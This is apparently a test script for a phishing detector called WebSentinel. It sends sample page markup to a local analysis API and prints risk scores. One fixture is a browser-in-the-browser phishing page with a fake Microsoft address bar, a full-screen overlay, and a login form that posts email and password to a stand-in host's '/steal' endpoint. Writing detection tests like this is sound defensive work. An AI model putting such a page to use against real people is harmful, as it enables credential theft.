"""
tests/test_bitb_detection.py
─────────────────────────────
Sends test cases to the /analyze API and prints layer scores.
Backend must be running first (use run.bat).

Usage:
    python tests/test_bitb_detection.py
"""
import json
import sys
try:
    import httpx
except ImportError:
    sys.exit("Run: pip install httpx")

API = "http://127.0.0.1:8001"

# ── Test DOM samples ──────────────────────────────────────────────────────────

# 1. Classic BitB attack DOM — fake browser popup overlay
BITB_DOM = """
<html>
<head>
  <title>Microsoft - Sign In</title>
  <link rel="icon" href="https://microsoft.com/favicon.ico"/>
</head>
<body style="margin:0;padding:0;user-select:none" ondragstart="return false">
  <div style="
      position:fixed; top:0; left:0;
      width:100vw; height:100vh;
      z-index:99999;
      background:#fff;
  " class="overlay">
    <!-- Fake browser chrome bar -->
    <div class="fake-address-bar browser-bar" style="background:#f1f3f4;padding:8px;">
      <span>https://login.microsoft.com/oauth2/v2.0/authorize</span>
    </div>
    <iframe
      src="http://evil-phish.xyz/microsoft-login"
      style="position:fixed;width:100%;height:100%;border:none;"
    ></iframe>
    <form action="http://evil-phish.xyz/steal" method="POST">
      <input type="hidden" name="token" value="abc123"/>
      <input type="email" placeholder="Email"/>
      <input type="password" placeholder="Password"/>
      <button type="submit">Sign in</button>
    </form>
  </div>
  <script src="http://evil-phish.xyz/tracker.js"></script>
  <script>
    window.onload = function() { window.location = window.location; }
  </script>
</body>
</html>
"""

# 2. Legitimate page DOM — should score near 0
LEGIT_DOM = """
<html>
<head><title>My Personal Blog</title></head>
<body>
  <h1>Welcome to my blog</h1>
  <p>Today I want to talk about Python programming.</p>
  <form action="/comment" method="POST">
    <input type="text" placeholder="Your comment"/>
    <button type="submit">Post</button>
  </form>
</body>
</html>
"""

# 3. Minimal BitB — only heuristic triggers, no ML-strong signals
MINIMAL_BITB_DOM = """
<html>
<head><title>PayPal Secure Login</title></head>
<body>
  <div style="position:fixed;width:100vw;height:100vh;z-index:9999;">
    <iframe style="position:fixed;width:100%;height:100%;" src="http://paypal-secure.fakesite.tk/login">
    </iframe>
  </div>
</body>
</html>
"""

TESTS = [
    {
        "name": "Classic BitB Attack (should be PHISHING)",
        "url":  "http://evil-phish.xyz/microsoft-login",
        "dom":  BITB_DOM,
    },
    {
        "name": "Legitimate Blog Page (should be SAFE)",
        "url":  "https://myblog.example.com/post/1",
        "dom":  LEGIT_DOM,
    },
    {
        "name": "Minimal BitB Overlay (should be SUSPICIOUS/PHISHING)",
        "url":  "http://paypal-secure.fakesite.tk/login",
        "dom":  MINIMAL_BITB_DOM,
    },
]


def run_tests():
    print("=" * 60)
    print(" WebSentinel — BitB Detection Test")
    print("=" * 60)

    # Check backend is up
    try:
        r = httpx.get(f"{API}/health", timeout=3)
        if r.json().get("status") != "ok":
            raise ValueError
        print(f"Backend: OK (port 8001)\n")
    except Exception:
        print("ERROR: Backend not running. Start run.bat first.\n")
        sys.exit(1)

    for i, test in enumerate(TESTS, 1):
        print(f"[Test {i}] {test['name']}")
        print(f"  URL: {test['url']}")

        r = httpx.post(f"{API}/analyze", json={
            "url": test["url"],
            "dom": test["dom"],
        }, timeout=15)

        result = r.json()
        verdict    = result.get("verdict", "?")
        risk_score = result.get("risk_score", 0)
        layers     = result.get("layers", [])

        print(f"  Verdict:    {verdict}")
        print(f"  Risk Score: {risk_score}/100")
        print(f"  Layers:")
        for layer in layers:
            bar = "#" * int(layer["score"] * 20)
            print(f"    {layer['id']} {layer['name']:20s} score={layer['score']:.4f} [{bar:<20}]  {layer['detail']}")
        print()


if __name__ == "__main__":
    run_tests()
